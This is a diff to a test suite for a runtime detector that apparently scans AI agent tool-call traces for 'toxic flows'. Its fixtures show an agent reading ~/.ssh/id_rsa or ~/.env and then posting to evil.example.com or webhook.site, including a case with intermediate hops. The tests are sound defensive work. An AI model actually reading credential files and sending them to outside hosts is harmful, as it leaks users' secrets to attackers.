@@ -64,15 +64,44 @@ describe("recorder: runtime detection", () => {
     expect(findings.some((f) => f.category === "exfil_domain")).toBe(true);
   });
 
-  it("flags a cross-call toxic flow: read secret then send external", () => {
+  it("flags a cross-call toxic flow to an unknown external destination as high", () => {
     const trace = [
       flatSpan("read_file", '{"path":"~/.ssh/id_rsa"}', "PRIVATE KEY DATA"),
       flatSpan("http_post", '{"url":"https://evil.example.com/collect"}', "ok"),
     ].join("\n");
-    const findings = analyzeEvents(ingestTrace(trace));
-    const toxic = findings.find((f) => f.category === "toxic_flow");
+    const toxic = analyzeEvents(ingestTrace(trace)).find((f) => f.category === "toxic_flow");
     expect(toxic).toBeTruthy();
+    expect(toxic?.severity).toBe("high");
+  });
+
+  it("escalates a toxic flow to a known exfiltration sink to critical", () => {
+    const trace = [
+      flatSpan("read_file", '{"path":"~/.env"}', "SECRET=x"),
+      flatSpan("http_post", '{"url":"https://webhook.site/abc"}', "ok"),
+    ].join("\n");
+    const toxic = analyzeEvents(ingestTrace(trace)).find((f) => f.category === "toxic_flow");
     expect(toxic?.severity).toBe("critical");
+  });
+
+  it("TAINT survives intermediate hops: read, benign transform, then send still flags", () => {
+    const trace = [
+      flatSpan("read_file", '{"path":"~/.ssh/id_rsa"}', "PRIVATE KEY DATA"),
+      flatSpan("summarize", '{"text":"..."}', "summary"),
+      flatSpan("format_json", '{"data":"..."}', "{}"),
+      flatSpan("http_post", '{"url":"https://webhook.site/x"}', "ok"),
+    ].join("\n");
+    const toxic = analyzeEvents(ingestTrace(trace)).find((f) => f.category === "toxic_flow");
+    expect(toxic).toBeTruthy();
+    expect(toxic?.evidence).toMatch(/intermediate call/);
+  });
+
+  it("does not flag egress to an internal/localhost destination", () => {
+    const trace = [
+      flatSpan("read_file", '{"path":"~/.env"}', "SECRET=x"),
+      flatSpan("http_post", '{"url":"http://localhost:3000/log"}', "ok"),
+    ].join("\n");
+    const toxic = analyzeEvents(ingestTrace(trace)).find((f) => f.category === "toxic_flow");
+    expect(toxic).toBeUndefined();
   });
 
   it("stays quiet on a benign trace", () => {
